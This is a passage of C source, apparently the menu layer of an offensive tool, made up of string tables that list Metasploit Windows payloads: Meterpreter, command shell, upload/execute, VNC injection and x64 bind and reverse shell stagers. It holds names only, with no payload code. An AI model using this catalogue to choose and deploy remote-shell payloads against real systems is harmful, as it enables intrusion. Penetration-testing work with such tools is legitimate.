char 	tbl_payloadwindowspatchupmeterpreter_11[] = "  [11]  payload/windows/patchupmeterpreter/reverse_ipv6_tcp                          normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_12[] = "  [12]  payload/windows/patchupmeterpreter/reverse_nonx_tcp                          normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_13[] = "  [13]  payload/windows/patchupmeterpreter/reverse_ord_tcp                           normal  No     Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_14[] = "  [14]  payload/windows/patchupmeterpreter/reverse_tcp                               normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_15[] = "  [15]  payload/windows/patchupmeterpreter/reverse_tcp_allports                      normal  No     Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_16[] = "  [16]  payload/windows/patchupmeterpreter/reverse_tcp_dns                           normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_17[] = "  [17]  payload/windows/patchupmeterpreter/reverse_tcp_rc4                           normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_18[] = "  [18]  payload/windows/patchupmeterpreter/reverse_tcp_rc4_dns                       normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_19[] = "  [19]  payload/windows/patchupmeterpreter/reverse_tcp_uuid                          normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowspatchupmeterpreter_20[] = " \n   -    ---- \n"; 


char 	payloadwindowspatchupmeterpreter_1[]  = "windows/patchupmeterpreter/bind_hidden_ipknock_tcp";
char 	payloadwindowspatchupmeterpreter_2[]  = "windows/patchupmeterpreter/bind_hidden_tcp";
char 	payloadwindowspatchupmeterpreter_3[]  = "windows/patchupmeterpreter/bind_ipv6_tcp";
char 	payloadwindowspatchupmeterpreter_4[]  = "windows/patchupmeterpreter/bind_ipv6_tcp_uuid";
char 	payloadwindowspatchupmeterpreter_5[]  = "windows/patchupmeterpreter/bind_named_pipe";
char 	payloadwindowspatchupmeterpreter_6[]  = "windows/patchupmeterpreter/bind_nonx_tcp"; 
char 	payloadwindowspatchupmeterpreter_7[]  = "windows/patchupmeterpreter/bind_tcp";
char 	payloadwindowspatchupmeterpreter_8[]  = "windows/patchupmeterpreter/bind_tcp_rc4";
char 	payloadwindowspatchupmeterpreter_9[]  = "windows/patchupmeterpreter/bind_tcp_uuid";
char 	payloadwindowspatchupmeterpreter_10[] = "windows/patchupmeterpreter/find_tag";
char 	payloadwindowspatchupmeterpreter_11[] = "windows/patchupmeterpreter/reverse_ipv6_tcp";
char 	payloadwindowspatchupmeterpreter_12[] = "windows/patchupmeterpreter/reverse_nonx_tcp";
char 	payloadwindowspatchupmeterpreter_13[] = "windows/patchupmeterpreter/reverse_ord_tcp";
char 	payloadwindowspatchupmeterpreter_14[] = "windows/patchupmeterpreter/reverse_tcp";
char 	payloadwindowspatchupmeterpreter_15[] = "windows/patchupmeterpreter/reverse_tcp_allports";
char 	payloadwindowspatchupmeterpreter_16[] = "windows/patchupmeterpreter/reverse_tcp_dns";
char 	payloadwindowspatchupmeterpreter_17[] = "windows/patchupmeterpreter/reverse_tcp_rc4";
char 	payloadwindowspatchupmeterpreter_18[] = "windows/patchupmeterpreter/reverse_tcp_rc4_dns";
char 	payloadwindowspatchupmeterpreter_19[] = "windows/patchupmeterpreter/reverse_tcp_uuid";   


// tableau de type de payload windows shell
char 	tbl_payloadwindowsshell_str[]	= "Selecte your payload : "; 
char 	tbl_payloadwindowsshell_0[]  	= "  [0]   Exit\n"; 
char 	tbl_payloadwindowsshell_1[]  	= "  [1]   payload/windows/shell/bind_hidden_ipknock_tcp                                normal  No     Windows Command Shell, Hidden Bind Ipknock TCP Stager\n"; 
char 	tbl_payloadwindowsshell_2[]  	= "  [2]   payload/windows/shell/bind_hidden_tcp                                        normal  No     Windows Command Shell, Hidden Bind TCP Stager\n"; 
char 	tbl_payloadwindowsshell_3[]  	= "  [3]   payload/windows/shell/bind_ipv6_tcp                                          normal  No     Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowsshell_4[]  	= "  [4]   payload/windows/shell/bind_ipv6_tcp_uuid                                     normal  No     Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowsshell_5[]  	= "  [5]   payload/windows/shell/bind_named_pipe                                        normal  No     Windows Command Shell, Windows x86 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowsshell_6[]  	= "  [6]   payload/windows/shell/bind_nonx_tcp                                          normal  No     Windows Command Shell, Bind TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsshell_7[]  	= "  [7]   payload/windows/shell/bind_tcp                                               normal  No     Windows Command Shell, Bind TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowsshell_8[]  	= "  [8]   payload/windows/shell/bind_tcp_rc4                                           normal  No     Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsshell_9[]  	= "  [9]   payload/windows/shell/bind_tcp_uuid                                          normal  No     Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowsshell_10[]  	= "  [10]  payload/windows/shell/find_tag                                               normal  No     Windows Command Shell, Find Tag Ordinal Stager\n"; 
char 	tbl_payloadwindowsshell_11[]  	= "  [11]  payload/windows/shell/reverse_ipv6_tcp                                       normal  No     Windows Command Shell, Reverse TCP Stager (IPv6)\n"; 
char 	tbl_payloadwindowsshell_12[]  	= "  [12]  payload/windows/shell/reverse_nonx_tcp                                       normal  No     Windows Command Shell, Reverse TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsshell_13[]  	= "  [13]  payload/windows/shell/reverse_ord_tcp                                        normal  No     Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsshell_14[]  	= "  [14]  payload/windows/shell/reverse_tcp                                            normal  No     Windows Command Shell, Reverse TCP Stager\n"; 
char 	tbl_payloadwindowsshell_15[]  	= "  [15]  payload/windows/shell/reverse_tcp_allports                                   normal  No     Windows Command Shell, Reverse All-Port TCP Stager\n"; 
char 	tbl_payloadwindowsshell_16[]  	= "  [16]  payload/windows/shell/reverse_tcp_dns                                        normal  No     Windows Command Shell, Reverse TCP Stager (DNS)\n"; 
char 	tbl_payloadwindowsshell_17[]  	= "  [17]  payload/windows/shell/reverse_tcp_rc4                                        normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsshell_18[]  	= "  [18]  payload/windows/shell/reverse_tcp_rc4_dns                                    normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)\n"; 
char 	tbl_payloadwindowsshell_19[]  	= "  [19]  payload/windows/shell/reverse_tcp_uuid                                       normal  No     Windows Command Shell, Reverse TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsshell_20[]  	= "  [20]  payload/windows/shell/reverse_udp                                            normal  No     Windows Command Shell, Reverse UDP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsshell_21[]  	= "  [21]  payload/windows/shell_bind_tcp                                               normal  No     Windows Command Shell, Bind TCP Inline\n"; 
char 	tbl_payloadwindowsshell_22[]  	= "  [22]  payload/windows/shell_bind_tcp_xpfw                                          normal  No     Windows Disable Windows ICF, Command Shell, Bind TCP Inline\n"; 
char 	tbl_payloadwindowsshell_23[]  	= "  [23]  payload/windows/shell_hidden_bind_tcp                                        normal  No     Windows Command Shell, Hidden Bind TCP Inline\n"; 
char 	tbl_payloadwindowsshell_24[]  	= "  [24]  payload/windows/shell_reverse_tcp                                            normal  No     Windows Command Shell, Reverse TCP Inline\n"; 
char 	tbl_payloadwindowsshell_25[]  	= " \n   -    ---- \n"; 

char 	payloadwindowsshell_1[]  	= "windows/shell/bind_hidden_ipknock_tcp";
char 	payloadwindowsshell_2[]  	= "windows/shell/bind_hidden_tcp";
char 	payloadwindowsshell_3[]  	= "windows/shell/bind_ipv6_tcp";
char 	payloadwindowsshell_4[]  	= "windows/shell/bind_ipv6_tcp_uuid";
char 	payloadwindowsshell_5[]  	= "windows/shell/bind_named_pipe";
char 	payloadwindowsshell_6[]  	= "windows/shell/bind_nonx_tcp";
char 	payloadwindowsshell_7[]  	= "windows/shell/bind_tcp";
char 	payloadwindowsshell_8[]  	= "windows/shell/bind_tcp_rc4";
char 	payloadwindowsshell_9[]  	= "windows/shell/bind_tcp_uuid";
char 	payloadwindowsshell_10[]  	= "windows/shell/find_tag";
char 	payloadwindowsshell_11[]  	= "windows/shell/reverse_ipv6_tcp";
char 	payloadwindowsshell_12[]  	= "windows/shell/reverse_nonx_tcp";
char 	payloadwindowsshell_13[]  	= "windows/shell/reverse_ord_tcp";
char 	payloadwindowsshell_14[]  	= "windows/shell/reverse_tcp";
char 	payloadwindowsshell_15[]  	= "windows/shell/reverse_tcp_allports";
char 	payloadwindowsshell_16[]  	= "windows/shell/reverse_tcp_dns";
char 	payloadwindowsshell_17[]  	= "windows/shell/reverse_tcp_rc4";
char 	payloadwindowsshell_18[]  	= "windows/shell/reverse_tcp_rc4_dns";
char 	payloadwindowsshell_19[]  	= "windows/shell/reverse_tcp_uuid";
char 	payloadwindowsshell_20[]  	= "windows/shell/reverse_udp";
char 	payloadwindowsshell_21[]  	= "windows/shell_bind_tcp";
char 	payloadwindowsshell_22[]  	= "windows/shell_bind_tcp_xpfw";
char 	payloadwindowsshell_23[]  	= "windows/shell_hidden_bind_tcp";
char 	payloadwindowsshell_24[]  	= "windows/shell_reverse_tcp";   


// tableau de type de payload windows upexec
char 	tbl_payloadwindowsupexec_str[]	= "Selecte your payload : "; 
char 	tbl_payloadwindowsupexec_0[]  	= "  [0]   Exit\n"; 
char 	tbl_payloadwindowsupexec_1[]  	= "  [1]   payload/windows/upexec/bind_hidden_ipknock_tcp                               normal  No     Windows Upload/Execute, Hidden Bind Ipknock TCP Stager\n"; 
char 	tbl_payloadwindowsupexec_2[]  	= "  [2]   payload/windows/upexec/bind_hidden_tcp                                       normal  No     Windows Upload/Execute, Hidden Bind TCP Stager\n"; 
char 	tbl_payloadwindowsupexec_3[]  	= "  [3]   payload/windows/upexec/bind_ipv6_tcp                                         normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowsupexec_4[]  	= "  [4]   payload/windows/upexec/bind_ipv6_tcp_uuid                                    normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowsupexec_5[]  	= "  [5]   payload/windows/upexec/bind_named_pipe                                       normal  No     Windows Upload/Execute, Windows x86 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowsupexec_6[]  	= "  [6]   payload/windows/upexec/bind_nonx_tcp                                         normal  No     Windows Upload/Execute, Bind TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsupexec_7[]  	= "  [7]   payload/windows/upexec/bind_tcp                                              normal  No     Windows Upload/Execute, Bind TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowsupexec_8[]  	= "  [8]   payload/windows/upexec/bind_tcp_rc4                                          normal  No     Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsupexec_9[]  	= "  [9]   payload/windows/upexec/bind_tcp_uuid                                         normal  No     Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowsupexec_10[]  	= "  [10]  payload/windows/upexec/find_tag                                              normal  No     Windows Upload/Execute, Find Tag Ordinal Stager\n"; 
char 	tbl_payloadwindowsupexec_11[]  	= "  [11]  payload/windows/upexec/reverse_ipv6_tcp                                      normal  No     Windows Upload/Execute, Reverse TCP Stager (IPv6)\n"; 
char 	tbl_payloadwindowsupexec_12[]  	= "  [12]  payload/windows/upexec/reverse_nonx_tcp                                      normal  No     Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsupexec_13[]  	= "  [13]  payload/windows/upexec/reverse_ord_tcp                                       normal  No     Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsupexec_14[]  	= "  [14]  payload/windows/upexec/reverse_tcp                                           normal  No     Windows Upload/Execute, Reverse TCP Stager\n"; 
char 	tbl_payloadwindowsupexec_15[]  	= "  [15]  payload/windows/upexec/reverse_tcp_allports                                  normal  No     Windows Upload/Execute, Reverse All-Port TCP Stager\n"; 
char 	tbl_payloadwindowsupexec_16[]  	= "  [16]  payload/windows/upexec/reverse_tcp_dns                                       normal  No     Windows Upload/Execute, Reverse TCP Stager (DNS)\n"; 
char 	tbl_payloadwindowsupexec_17[]  	= "  [17]  payload/windows/upexec/reverse_tcp_rc4                                       normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsupexec_18[]  	= "  [18]  payload/windows/upexec/reverse_tcp_rc4_dns                                   normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)\n"; 
char 	tbl_payloadwindowsupexec_19[]  	= "  [19]  payload/windows/upexec/reverse_tcp_uuid                                      normal  No     Windows Upload/Execute, Reverse TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsupexec_20[]  	= "  [20]  payload/windows/upexec/reverse_udp                                           normal  No     Windows Upload/Execute, Reverse UDP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsupexec_21[]  	= " \n   -    ---- \n"; 

char 	payloadwindowsupexec_1[]  	= "windows/upexec/bind_hidden_ipknock_tcp";
char 	payloadwindowsupexec_2[]  	= "windows/upexec/bind_hidden_tcp";
char 	payloadwindowsupexec_3[]  	= "windows/upexec/bind_ipv6_tcp"; 
char 	payloadwindowsupexec_4[]  	= "windows/upexec/bind_ipv6_tcp_uuid"; 
char 	payloadwindowsupexec_5[]  	= "windows/upexec/bind_named_pipe";
char 	payloadwindowsupexec_6[]  	= "windows/upexec/bind_nonx_tcp";
char 	payloadwindowsupexec_7[]  	= "windows/upexec/bind_tcp";
char 	payloadwindowsupexec_8[]  	= "windows/upexec/bind_tcp_rc4";
char 	payloadwindowsupexec_9[]  	= "windows/upexec/bind_tcp_uuid";
char 	payloadwindowsupexec_10[]  	= "windows/upexec/find_tag"; 
char 	payloadwindowsupexec_11[]  	= "windows/upexec/reverse_ipv6_tcp";
char 	payloadwindowsupexec_12[]  	= "windows/upexec/reverse_nonx_tcp";
char 	payloadwindowsupexec_13[]  	= "windows/upexec/reverse_ord_tcp";
char 	payloadwindowsupexec_14[]  	= "windows/upexec/reverse_tcp";
char 	payloadwindowsupexec_15[]  	= "windows/upexec/reverse_tcp_allports";
char 	payloadwindowsupexec_16[]  	= "windows/upexec/reverse_tcp_dns";
char 	payloadwindowsupexec_17[]  	= "windows/upexec/reverse_tcp_rc4";
char 	payloadwindowsupexec_18[]  	= "windows/upexec/reverse_tcp_rc4_dns";
char 	payloadwindowsupexec_19[]  	= "windows/upexec/reverse_tcp_uuid";
char 	payloadwindowsupexec_20[]  	= "windows/upexec/reverse_udp";  


// tableau de type de payload windows vncinject
char 	tbl_payloadwindowsvncinject_str[] = "Selecte your payload : "; 
char 	tbl_payloadwindowsvncinject_0[]  = "  [0]   Exit\n"; 
char 	tbl_payloadwindowsvncinject_1[]  = "  [1]   payload/windows/vncinject/bind_hidden_ipknock_tcp                            normal  No     VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager\n"; 
char 	tbl_payloadwindowsvncinject_2[]  = "  [2]   payload/windows/vncinject/bind_hidden_tcp                                    normal  No     VNC Server (Reflective Injection), Hidden Bind TCP Stager\n"; 
char 	tbl_payloadwindowsvncinject_3[]  = "  [3]   payload/windows/vncinject/bind_ipv6_tcp                                      normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowsvncinject_4[]  = "  [4]   payload/windows/vncinject/bind_ipv6_tcp_uuid                                 normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowsvncinject_5[]  = "  [5]   payload/windows/vncinject/bind_named_pipe                                    normal  No     VNC Server (Reflective Injection), Windows x86 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowsvncinject_6[]  = "  [6]   payload/windows/vncinject/bind_nonx_tcp                                      normal  No     VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsvncinject_7[]  = "  [7]   payload/windows/vncinject/bind_tcp                                           normal  No     VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)\n"; 
char 	tbl_payloadwindowsvncinject_8[]  = "  [8]   payload/windows/vncinject/bind_tcp_rc4                                       normal  No     VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsvncinject_9[]  = "  [9]   payload/windows/vncinject/bind_tcp_uuid                                      normal  No     VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)\n"; 
char 	tbl_payloadwindowsvncinject_10[] = "  [10]  payload/windows/vncinject/find_tag                                           normal  No     VNC Server (Reflective Injection), Find Tag Ordinal Stager\n"; 
char 	tbl_payloadwindowsvncinject_11[] = "  [11]  payload/windows/vncinject/find_tag                                           normal  No     VNC Server (Reflective Injection), Find Tag Ordinal Stager\n"; 
char 	tbl_payloadwindowsvncinject_12[] = "  [12]  payload/windows/vncinject/reverse_hop_http                                   normal  No     VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager\n"; 
char 	tbl_payloadwindowsvncinject_13[] = "  [13]  payload/windows/vncinject/reverse_http                                       normal  No     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)\n"; 
char 	tbl_payloadwindowsvncinject_14[] = "  [14]  payload/windows/vncinject/reverse_http_proxy_pstore                          normal  No     VNC Server (Reflective Injection), Reverse HTTP Stager Proxy\n"; 
char 	tbl_payloadwindowsvncinject_15[] = "  [15]  payload/windows/vncinject/reverse_ipv6_tcp                                   normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)\n"; 
char 	tbl_payloadwindowsvncinject_16[] = "  [16]  payload/windows/vncinject/reverse_nonx_tcp                                   normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsvncinject_17[] = "  [17]  payload/windows/vncinject/reverse_ord_tcp                                    normal  No     VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)\n"; 
char 	tbl_payloadwindowsvncinject_18[] = "  [18]  payload/windows/vncinject/reverse_tcp                                        normal  No     VNC Server (Reflective Injection), Reverse TCP Stager\n"; 
char 	tbl_payloadwindowsvncinject_19[] = "  [19]  payload/windows/vncinject/reverse_tcp_allports                               normal  No     VNC Server (Reflective Injection), Reverse All-Port TCP Stager\n"; 
char 	tbl_payloadwindowsvncinject_20[] = "  [20]  payload/windows/vncinject/reverse_tcp_dns                                    normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (DNS)\n"; 
char 	tbl_payloadwindowsvncinject_21[] = "  [21]  payload/windows/vncinject/reverse_tcp_rc4                                    normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsvncinject_22[] = "  [22]  payload/windows/vncinject/reverse_tcp_rc4_dns                                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)\n"; 
char 	tbl_payloadwindowsvncinject_23[] = "  [23]  payload/windows/vncinject/reverse_tcp_uuid                                   normal  No     VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsvncinject_24[] = "  [24]  payload/windows/vncinject/reverse_winhttp                                    normal  No     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)\n"; 
char 	tbl_payloadwindowsvncinject_25[] =  "\n   -    ---- \n"; 


char 	payloadwindowsvncinject_1[]  = "windows/vncinject/bind_hidden_ipknock_tcp";
char 	payloadwindowsvncinject_2[]  = "windows/vncinject/bind_hidden_tcp";
char 	payloadwindowsvncinject_3[]  = "windows/vncinject/bind_ipv6_tcp";
char 	payloadwindowsvncinject_4[]  = "windows/vncinject/bind_ipv6_tcp_uuid"; 
char 	payloadwindowsvncinject_5[]  = "windows/vncinject/bind_named_pipe"; 
char 	payloadwindowsvncinject_6[]  = "windows/vncinject/bind_nonx_tcp";
char 	payloadwindowsvncinject_7[]  = "windows/vncinject/bind_tcp";
char 	payloadwindowsvncinject_8[]  = "windows/vncinject/bind_tcp_rc4"; 
char 	payloadwindowsvncinject_9[]  = "windows/vncinject/bind_tcp_uuid"; 
char 	payloadwindowsvncinject_10[] = "windows/vncinject/find_tag"; 
char 	payloadwindowsvncinject_11[] = "windows/vncinject/find_tag";
char 	payloadwindowsvncinject_12[] = "windows/vncinject/reverse_hop_http";
char 	payloadwindowsvncinject_13[] = "windows/vncinject/reverse_http";
char 	payloadwindowsvncinject_14[] = "windows/vncinject/reverse_http_proxy_pstore"; 
char 	payloadwindowsvncinject_15[] = "windows/vncinject/reverse_ipv6_tcp";
char 	payloadwindowsvncinject_16[] = "windows/vncinject/reverse_nonx_tcp";
char 	payloadwindowsvncinject_17[] = "windows/vncinject/reverse_ord_tcp";
char 	payloadwindowsvncinject_18[] = "windows/vncinject/reverse_tcp";
char 	payloadwindowsvncinject_19[] = "windows/vncinject/reverse_tcp_allports";
char 	payloadwindowsvncinject_20[] = "windows/vncinject/reverse_tcp_dns";
char 	payloadwindowsvncinject_21[] = "windows/vncinject/reverse_tcp_rc4";
char 	payloadwindowsvncinject_22[] = "windows/vncinject/reverse_tcp_rc4_dns";
char 	payloadwindowsvncinject_23[] = "windows/vncinject/reverse_tcp_uuid";
char 	payloadwindowsvncinject_24[] = "windows/vncinject/reverse_winhttp";  


// tableau de type de payload windows x64
char 	tbl_payloadwindowsx64_str[] 	= "Selecte your payload : "; 
char 	tbl_payloadwindowsx64_0[]  	= "  [0]   Exit\n"; 
char 	tbl_payloadwindowsx64_1[]  	= "  [1]   payload/windows/x64/encrypted_shell/reverse_tcp                              normal  No     Windows Command Shell, Encrypted Reverse TCP Stager\n"; 
char 	tbl_payloadwindowsx64_2[]  	= "  [2]   payload/windows/x64/encrypted_shell_reverse_tcp                              normal  No     Windows Encrypted Reverse Shell\n"; 
char 	tbl_payloadwindowsx64_3[]  	= "  [3]   payload/windows/x64/exec                                                     normal  No     Windows x64 Execute Command\n"; 
char 	tbl_payloadwindowsx64_4[]  	= "  [4]   payload/windows/x64/loadlibrary                                              normal  No     Windows x64 LoadLibrary Path\n"; 
char 	tbl_payloadwindowsx64_5[]  	= "  [5]   payload/windows/x64/messagebox                                               normal  No     Windows MessageBox x64\n"; 
char 	tbl_payloadwindowsx64_6[]  	= "  [6]   payload/windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager\n"; 
char 	tbl_payloadwindowsx64_7[]  	= "  [7]   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsx64_8[]  	= "  [8]   payload/windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowsx64_9[]  	= "  [9]   payload/windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager\n"; 
char 	tbl_payloadwindowsx64_10[]  	= "  [10]  payload/windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsx64_11[]  	= "  [11]  payload/windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)\n"; 
char 	tbl_payloadwindowsx64_12[]  	= "  [12]  payload/windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)\n"; 
char 	tbl_payloadwindowsx64_13[]  	= "  [13]  payload/windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)\n"; 
char 	tbl_payloadwindowsx64_14[]  	= "  [14]  payload/windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager\n"; 
char 	tbl_payloadwindowsx64_15[]  	= "  [15]  payload/windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager\n"; 
char 	tbl_payloadwindowsx64_16[]  	= "  [16]  payload/windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsx64_17[]  	= "  [17]  payload/windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)\n"; 
char 	tbl_payloadwindowsx64_18[]  	= "  [18]  payload/windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)\n"; 
char 	tbl_payloadwindowsx64_19[]  	= "  [19]  payload/windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)\n"; 
char 	tbl_payloadwindowsx64_20[]  	= "  [20]  payload/windows/x64/meterpreter_bind_named_pipe                              normal  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)\n"; 
char 	tbl_payloadwindowsx64_21[]  	= "  [21]  payload/windows/x64/meterpreter_bind_tcp                                     normal  No     Windows Meterpreter Shell, Bind TCP Inline (x64)\n"; 
char 	tbl_payloadwindowsx64_22[]  	= "  [22]  payload/windows/x64/meterpreter_reverse_http                                 normal  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)\n"; 
char 	tbl_payloadwindowsx64_23[]  	= "  [23]  payload/windows/x64/meterpreter_reverse_https                                normal  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)\n"; 
char 	tbl_payloadwindowsx64_24[]  	= "  [24]  payload/windows/x64/meterpreter_reverse_ipv6_tcp                             normal  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)\n"; 
char 	tbl_payloadwindowsx64_25[]  	= "  [25]  payload/windows/x64/meterpreter_reverse_tcp                                  normal  No     Windows Meterpreter Shell, Reverse TCP Inline x64\n"; 
char 	tbl_payloadwindowsx64_26[]  	= "  [26]  payload/windows/x64/pingback_reverse_tcp                                     normal  No     Windows x64 Pingback, Reverse TCP Inline\n"; 
char 	tbl_payloadwindowsx64_27[]  	= "  [27]  payload/windows/x64/powershell_bind_tcp                                      normal  No     Windows Interactive Powershell Session, Bind TCP\n"; 
char 	tbl_payloadwindowsx64_28[]  	= "  [28]  payload/windows/x64/powershell_reverse_tcp                                   normal  No     Windows Interactive Powershell Session, Reverse TCP\n"; 
char 	tbl_payloadwindowsx64_29[]  	= "  [29]  payload/windows/x64/shell/bind_ipv6_tcp                                      normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager\n"; 
char 	tbl_payloadwindowsx64_30[]  	= "  [30]  payload/windows/x64/shell/bind_ipv6_tcp_uuid                                 normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support\n"; 
char 	tbl_payloadwindowsx64_31[]  	= "  [31]  payload/windows/x64/shell/bind_named_pipe                                    normal  No     Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager\n"; 
char 	tbl_payloadwindowsx64_32[]  	= "  [32]  payload/windows/x64/shell/bind_tcp                                           normal  No     Windows x64 Command Shell, Windows x64 Bind TCP Stager\n"; 
char 	tbl_payloadwindowsx64_33[]  	= "  [33]  payload/windows/x64/shell/bind_tcp_rc4                                       normal  No     Windows x64 Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)\n"; 
char 	tbl_payloadwindowsx64_34[]  	= "  [34]  payload/windows/x64/shell/bind_tcp_uuid                                      normal  No     Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)\n"; 
char 	tbl_payloadwindowsx64_35[]  	= "  [35]  payload/windows/x64/shell/reverse_tcp                                        normal  No     Windows x64 Command Shell, Windows x64 Reverse TCP Stager\n"; 
